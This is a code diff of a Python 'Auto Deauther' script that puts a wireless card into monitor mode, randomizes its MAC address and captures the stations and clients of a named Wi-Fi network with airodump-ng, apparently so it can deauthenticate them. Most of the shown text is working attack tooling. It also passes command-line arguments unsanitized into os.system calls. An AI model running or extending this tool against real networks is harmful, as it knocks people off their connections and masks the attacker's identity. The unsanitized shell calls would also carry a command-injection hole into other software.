@@ -54,20 +54,30 @@ def csv2blob(filename):
     clients_list = z
     
     return stations_list, clients_list
-
+print("#############################################################")
+print("---------Auto Deauther--------------------------------------#")
+print("----Dont do stupid things with this.------------------------#")
+print("--------I only wanted to write this one time ;)--------------#")
+print("#############################################################")
 essid= sys.argv[1]
+
+if essid == "-h":
+    print("Usage: python3 autoDeauth.py {ESSID} {WLAN-interface}")
+    print("=====================================================")
+    exit()
+
 interface=sys.argv[2]
 print("I will deauth the following ESSID: ")
 print(essid)
 
-
+os.system("iw mon0 del")
+os.system("rm testdump*")
 os.system("iw "+interface+" interface add mon0 type monitor")
-
-os.system("airmon-ng check kill")
 os.system("ifconfig mon0 down")
 os.system("macchanger -r mon0")
 os.system("	ifconfig mon0 up")
 print( "------------mon0 created--------------")
+
 os.system("gnome-terminal -- airodump-ng -w testdump -o csv --essid "+essid+" mon0 ")
 input("Press Enter to continue...")
 os.system("killall airodump-ng")
